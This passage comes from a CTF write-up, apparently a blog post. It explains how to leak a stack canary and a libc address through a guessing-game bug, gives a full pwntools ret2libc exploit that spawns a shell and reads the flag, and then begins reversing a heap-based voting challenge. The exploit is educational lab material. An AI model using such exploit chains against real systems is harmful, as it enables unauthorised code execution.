+</span></span></code></pre></div><p>where you can enter bytes smaller than 0x41 to access values before the array.</p>
+<p>This is how the array looks in memory:</p>
+<pre tabindex="0"><code>0x7fffffffe0f8: 0x8e9331be0e56d100 &lt;- canary
+...           
+0x7fffffffe138: 0x00007ffff7e3dee3 &lt;_IO_file_overflow+259&gt; &lt;- libc address
+...
+0x7fffffffe1c8: 0x00000001deadbef0 &lt;- your guess (0xdeadbef0)
+0x7fffffffe1d0: 0xcafebabedeadbeef &lt;- local_128
+0x7fffffffe1d8: 0x794279421337c0d3
+...
+</code></pre><p>This means that you can use negative indexes to access your previous guess, the canary, and libc address, and use them as your current guess.</p>
+<p>Keep in mind tho that you don&rsquo;t get to directly input the indexes, and have to input a byte that is first subtracted with 0x41, then only be used to index <code>local_128</code>. So if I input byte <code>\x0b</code>, the array will be indexed through <code>local_128[0xb-0x41]</code>, and the first 4 bytes of the canary will be used as our current guess.</p>
+<p>And memory will look like this:</p>
+<pre tabindex="0"><code>...           
+0x7fffffffe1c8: 0x000000010e56d100 &lt;- your current guess before any +-*/ is performed
+0x7fffffffe1d0: 0xcafebabedeadbeef &lt;- local_128
+0x7fffffffe1d8: 0x794279421337c0d3
+...
+</code></pre><p>Ok nice, so we can use either the canary or libc addresses as our guess, what can we do with that?</p>
+<p>We can actually use this to leak canary and libc, and once we have those values, we can just ret2libc using option <strong>102</strong>.</p>
+<p>But how do we actually leak values using number guessing?</p>
+<h3 id="leaking">Leaking<a hidden class="anchor" aria-hidden="true" href="#leaking">#</a></h3>
+<p>Since we know the random seed, we always know what the correct guess is.</p>
+<p>If we take the canary as our random guess, and shift it 31 bits to the left, leaving the LSB of the canary as the MSB of our guess. Then setup the rest of the 31 bits to be same as the correct guess. We will know that the LSB of the canary, is same as the MSB of the correct guess, if our guess was correct and guessed_num() is called. If our guess was incorrect, then we know that the LSB bit of the canary is the opposite of the MSB bit of the correct guess.</p>
+<p>Example:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>(everything is represented in bits, and scaled down to 8 bits for simplicity of example)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ITERATION 1:
+</span></span><span style="display:flex;"><span>rand num: ...
+</span></span><span style="display:flex;"><span>canary: 10101010
+</span></span><span style="display:flex;"><span>guess: 10101010     &lt;- access canary using negative index
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>multiply 2**7 to shift guess 7 bits to the left
+</span></span><span style="display:flex;"><span>guess: 00000000
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ITERATION 2:
+</span></span><span style="display:flex;"><span>rand num: 11110000
+</span></span><span style="display:flex;"><span>guess: 00000000     &lt;- access back previous guess 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add 7 bits of the correct guess
+</span></span><span style="display:flex;"><span>guess: 01110000
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OUTCOME OF ITERATION 2:
+</span></span><span style="display:flex;"><span>wrong guess
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Thus we know that largest bit of our guess is wrong, and is NOT 1.
+</span></span><span style="display:flex;"><span>So the smallest bit of the canary, is 0.
+</span></span></code></pre></div><p>When we want to brute the next bit, we just shift one less bit to the left, so shift 6 bits, and do the same thing. We just have to do some slight calculations to correctly setup the other 7 bits of the correct guess.</p>
+<p>Example:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>let&#39;s say you found out the last bit of the canary to be 1,
+</span></span><span style="display:flex;"><span>when you shift the canary 6 bits to the left, you know that:
+</span></span><span style="display:flex;"><span>guess: ?1000000
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>during the next iteration of the infinite loop, say
+</span></span><span style="display:flex;"><span>rand num: 00001111
+</span></span><span style="display:flex;"><span>guess: ?1000000
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>to setup the rest of the 7 bits of your guess, you have to
+</span></span><span style="display:flex;"><span>subtract 15 from guess
+</span></span><span style="display:flex;"><span>guess: ?0001111
+</span></span></code></pre></div><p>Through this, we can brute the canary and libc bit by bit, and we can then just ret2libc!<br>
+You just need time to brute, and my exploit took a little under 2 mins to run on the remote server.</p>
+<p><strong>exploit.py</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> CDLL
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#io = process(&#34;./tear&#34;,aslr=True)</span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;10.100.0.43&#34;</span>,<span style="color:#ae81ff">10002</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
+</span></span><span style="display:flex;"><span>cdll_libc <span style="color:#f92672">=</span> CDLL(<span style="color:#e6db74">&#39;libc.so.6&#39;</span>)
+</span></span><span style="display:flex;"><span>cdll_libc<span style="color:#f92672">.</span>srand(<span style="color:#ae81ff">0x7b534341</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">brute_bit</span>(s):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># to use this func, bit alr has to be setup</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># only DONT change MSB</span>
+</span></span><span style="display:flex;"><span>    state <span style="color:#f92672">=</span> s
+</span></span><span style="display:flex;"><span>    cur_rand <span style="color:#f92672">=</span> cdll_libc<span style="color:#f92672">.</span>rand()
+</span></span><span style="display:flex;"><span>    target <span style="color:#f92672">=</span> cur_rand <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x7fffffff</span>
+</span></span><span style="display:flex;"><span>    state <span style="color:#f92672">=</span> (state<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0x7fffff00</span>) <span style="color:#f92672">+</span> ord(<span style="color:#e6db74">&#39;?&#39;</span>)
+</span></span><span style="display:flex;"><span>    diff <span style="color:#f92672">=</span> abs(target<span style="color:#f92672">-</span>state)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (target <span style="color:#f92672">&gt;</span> state):
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;relieved.&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;101&#34;</span>)
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;luck&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;?&#34;</span>) <span style="color:#75715e"># to choose back guess</span>
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;choice&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;+&#34;</span>)
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;plus...?&#34;</span>,str(diff)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;relieved.&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;101&#34;</span>)
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;luck&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;?&#34;</span>)
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;choice&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-&#34;</span>)
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;minus...?&#34;</span>,str(diff)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    resp <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;..&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;wow&#34;</span> <span style="color:#f92672">in</span> resp:
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># bit matches the rand</span>
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2069054273&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># have to do this for some reason</span>
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;relieved.&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;101&#34;</span>)
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;luck&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span>)
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;choice&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-&#34;</span>)
+</span></span><span style="display:flex;"><span>        cdll_libc<span style="color:#f92672">.</span>rand()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> cur_rand <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">31</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># bit does not match the rand</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">not</span> (cur_rand <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">31</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># realised when writing the writeup that this should be name dword, not qword</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">brute_qword</span>(idx,start_bit,end_bit,known<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># brute start bit - end bit, inclusive</span>
+</span></span><span style="display:flex;"><span>    qword <span style="color:#f92672">=</span> known
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(start_bit,end_bit<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># load the ptr we want to leak</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># multiply 2**n shift n bytes to left</span>
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;relieved.&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;101&#34;</span>)
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;luck&#34;</span>,idx<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;little&#34;</span>))
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;choice&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;*&#34;</span>)
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;multiply...?&#34;</span>,str(<span style="color:#ae81ff">2</span><span style="color:#f92672">**</span>(<span style="color:#ae81ff">31</span><span style="color:#f92672">-</span>i))<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>        cdll_libc<span style="color:#f92672">.</span>rand()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        new_bit <span style="color:#f92672">=</span> brute_bit(qword <span style="color:#f92672">&lt;&lt;</span> (<span style="color:#ae81ff">31</span><span style="color:#f92672">-</span>i))
+</span></span><span style="display:flex;"><span>        qword <span style="color:#f92672">=</span> (new_bit<span style="color:#f92672">&lt;&lt;</span>i) <span style="color:#f92672">+</span> qword
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;QWORD BRUTED&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> qword
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> (brute_qword(<span style="color:#ae81ff">0xc</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">31</span>)<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">32</span>) <span style="color:#f92672">+</span> (brute_qword(<span style="color:#ae81ff">0xb</span>,<span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">31</span>))
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;CANARY: &#34;</span> <span style="color:#f92672">+</span> hex(canary))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> (brute_qword(<span style="color:#ae81ff">0x1c</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">15</span>)<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">32</span>) <span style="color:#f92672">+</span> brute_qword(<span style="color:#ae81ff">0x1b</span>,<span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">31</span>,known<span style="color:#f92672">=</span><span style="color:#ae81ff">0xe3</span>) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;_IO_file_overflow&#34;</span>] <span style="color:#f92672">-</span> <span style="color:#ae81ff">259</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;LIBC BASE: &#34;</span> <span style="color:#f92672">+</span> hex(libc<span style="color:#f92672">.</span>address))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10f75b</span>)
+</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10f75c</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ret2libc <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x108</span> <span style="color:#f92672">+</span> p64(canary) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> ret
+</span></span><span style="display:flex;"><span>ret2libc <span style="color:#f92672">+=</span>  pop_rdi <span style="color:#f92672">+</span> p64(next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>))) <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;system&#34;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;relieved.&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;102&#34;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;skill.&#34;</span>,ret2libc)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;cat /home/acs_ctf/flag&#34;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h2 id="vote-your-favourite-ctf-pwn">vote your favourite ctf! (pwn)<a hidden class="anchor" aria-hidden="true" href="#vote-your-favourite-ctf-pwn">#</a></h2>
+<blockquote>
+<p>I was really really really close to solving this in the finals, but I ran out of time. Would&rsquo;ve been really satisfying to solve it but even if I did, we&rsquo;d still be 3rd. Also iirc only 2/10 teams solved it.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>    Arch:     amd64-64-little
+</span></span><span style="display:flex;"><span>    RELRO:    Full RELRO
+</span></span><span style="display:flex;"><span>    Stack:    Canary found
+</span></span><span style="display:flex;"><span>    NX:       NX enabled
+</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    LIBC: GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35. 
+</span></span></code></pre></div><p><a href="/acs24/src.c">src.c</a></p>
+<h3 id="reversing-1">Reversing<a hidden class="anchor" aria-hidden="true" href="#reversing-1">#</a></h3>
+<p>It&rsquo;s a C++ binary, where you can insert ctf names and vote ctfs.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>add your favorite ctfs!
+</span></span><span style="display:flex;"><span>1. add ctf
+</span></span><span style="display:flex;"><span>2. vote ctf
+</span></span><span style="display:flex;"><span>3. remove ctf
+</span></span><span style="display:flex;"><span>4. exit
+</span></span><span style="display:flex;"><span>input:
+</span></span></code></pre></div><p>Each ctf is stored as an object in the heap.<br>
+The addresses of these objects are stored in a global array which I named <code>ctfs_arr</code>.</p>
+<p>Each ctf object is 0x958 bytes, and has properties:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>- name
+</span></span><span style="display:flex;"><span>- topics
+</span></span><span style="display:flex;"><span>- photo width
+</span></span><span style="display:flex;"><span>- photo height
+</span></span><span style="display:flex;"><span>- photo
+</span></span><span style="display:flex;"><span>- photo magic value
+</span></span></code></pre></div><p>Which are all set when you add a ctf.</p>
+<p>The name is just a 31 byte C string and is always asked for, but the topics and photo is compulsory.</p>
+<p>If you do choose to write topics, the amount of topics is requested (must be &lt; 6).<br>
+Topic names are then read in as C++ basic_strings, and stored in a C++ vector.<br>
+(I actually didn&rsquo;t know that they&rsquo;re stored in vectors until after the ctf, more on this later)</p>
+<p>If you choose to give a photo, the width and height of the photo is requested, both of which are shorts and must be &lt; 0x30. Then, <code>width*height</code> bytes is read in as the photo, through:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>,pvVar3,(<span style="color:#66d9ef">long</span>)((<span style="color:#66d9ef">int</span>)height <span style="color:#f92672">*</span> (<span style="color:#66d9ef">int</span>)width));
+</span></span></code></pre></div><p>A magic value based on the photo is also generated, and stored at <code>object+0x938</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">set_magic</span>(<span style="color:#66d9ef">long</span> obj){
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> lVar1;
+</span></span><span style="display:flex;"><span>  lVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">generate_magic</span>(obj);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* if magic is not 0x1337133713371337, then set the magic */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lVar1 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x1337133713371337</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(obj <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x938</span>) <span style="color:#f92672">=</span> lVar1;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// just go through every byte of photo and magic = byte + magic*0x17
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">long</span> <span style="color:#a6e22e">generate_magic</span>(<span style="color:#66d9ef">long</span> obj){
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">short</span> j;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> local_10;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  local_10 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1337133713371337</span>;
+</span></span><span style="display:flex;"><span>  j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (((((<span style="color:#66d9ef">int</span>)j <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">int</span>)<span style="color:#f92672">*</span>(<span style="color:#66d9ef">short</span> <span style="color:#f92672">*</span>)(obj <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x16</span>) <span style="color:#f92672">*</span> (<span style="color:#66d9ef">int</span>)<span style="color:#f92672">*</span>(<span style="color:#66d9ef">short</span> <span style="color:#f92672">*</span>)(obj <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span>) <span style="color:#f92672">&amp;&amp;</span>
+</span></span><span style="display:flex;"><span>           (<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">short</span> <span style="color:#f92672">*</span>)(obj <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span>))) <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">short</span> <span style="color:#f92672">*</span>)(obj <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x16</span>))) <span style="color:#f92672">&amp;&amp;</span> (j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x900</span>))) {
+</span></span><span style="display:flex;"><span>    local_10 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span>)<span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)(obj <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x38</span> <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)(<span style="color:#66d9ef">int</span>)j) <span style="color:#f92672">+</span> local_10 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x17</span>;
+</span></span><span style="display:flex;"><span>    j <span style="color:#f92672">=</span> j <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> local_10;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Once you finish making a ctf, the photo is rendered and printed onto the screen.<br>
+The photo is just a bunch of <code>*</code>s and <code>.</code>s, having char &lsquo;1&rsquo; being a <code>*</code>, and the rest being <code>.</code>.<br>
+The raw bytes of the photo is also printed through <code>printf(&quot;... %s\n&quot;,...);</code></p>
+<p>The ctf objects looks something like this in memory:</p>
+<pre tabindex="0"><code>0x55555556feb0: 0x000055555555bc80   &lt;- pie readonly address storing funcptr   
+0x55555556feb8: 0x00000000           &lt;- votes
+0x55555556febc: 0x00000001           &lt;- has_photo boolean 
+0x55555556fec0: 0x00000000    
+0x55555556fec4: 0x0010               &lt;- photo width
+0x55555556fec6: 0x0020               &lt;- photo height
+0x55555556fec8: 0x00000072656d6167   &lt;- name
+...
+0x55555556fee8: 0x3231333231333231   &lt;- photo bytes
+...
+0x5555555707e8: 0x6b55ee1041d66d0f   &lt;- magic
+0x5555555707f0: 0x0000555555570840   &lt;-|  
+0x5555555707f8: 0x0000555555570880     |- topics vector stuff
+0x555555570800: 0x0000555555570880   &lt;-|
+
+------------------------------------------------------------------------------------------
+more on the pie readonly address:
+0x000055555556feb0: 0x000055555555bc80  →  0x0000555555558522  →   endbr64 
+
+#The vector object is also allocated in the heap as a chunk
+more on the vector object:
+0x555555570840: 0x0000555555570850      0x0000000000000004
+0x555555570850: 0x0000000041414141      0x0000000000000000
+0x555555570860: 0x0000555555570870      0x0000000000000004
+0x555555570870: 0x0000000042424242      0x0000000000000000
+0x555555570880: 0x0000000000000000
+
+
+Im pretty sure the vector ptrs in the ctf object are just the vector startptr and endptr:
+0x5555555707f0: 0x0000555555570840  
+0x5555555707f8: 0x0000555555570880  
+0x555555570800: 0x0000555555570880 (this ptr is diff when there&#39;s 3 elements tho)
+
+Inside the vector, the string / char ptr is stored, followed by the length of the str,
+then the actual bytes of the string:
+0x555555570840: 0x0000555555570850      0x0000000000000004
+0x555555570850: 0x0000000041414141      0x0000000000000000
+</code></pre><p>When you choose option <strong>2</strong> (vote a ctf), all ctf&rsquo;s name, photo render, and topic names will be printed.</p>
+<p>The magic number of all the ctfs with photos will be checked as well, and the process will exit if any magic numbers are wrong.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>ulong <span style="color:#a6e22e">check_magic</span>(<span style="color:#66d9ef">long</span> param_1){
+</span></span><span style="display:flex;"><span>  ulong uVar1;
+</span></span><span style="display:flex;"><span>  ulong uVar2;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(ulong <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x938</span>);
+</span></span><span style="display:flex;"><span>  uVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">generate_magic</span>(param_1);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (uVar1 <span style="color:#f92672">==</span> uVar2);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Once you vote a ctf, their total votes will +1.</p>
+<p>When you choose option <strong>3</strong>, and choose a ctf to remove by giving its index, the magic check will be done on the ctf as well. Once it passes the check, the address at <code>**ctf_object</code> will be called, with <code>ctf_object</code> being its argument. So:</p>
+<pre tabindex="0"><code>ctf_object = 0x000055555556feb0;
+0x000055555556feb0: 0x000055555555bc80  →  0x0000555555558522  →   endbr64
+
+$rip: 0x0000555555558522
+$rdi: 0x000055555556feb0
+</code></pre><p>I didn&rsquo;t really reverse the function at <code>0x0000555555558522</code>, but after its called, the vector object and the ctf object is freed. Afterwards the ctf object ptr is nullified in the ctf_arr list (so no UAF).</p>
+<p>When you choose option <strong>4</strong>, the ctf with the most votes is declared the winner, and main() returns afterwards.</p>
+<h3 id="vulnerabilities-1">Vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#vulnerabilities-1">#</a></h3>
+<p>When making a new ctf, you can enter negative width and height:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;width? &#34;</span>);
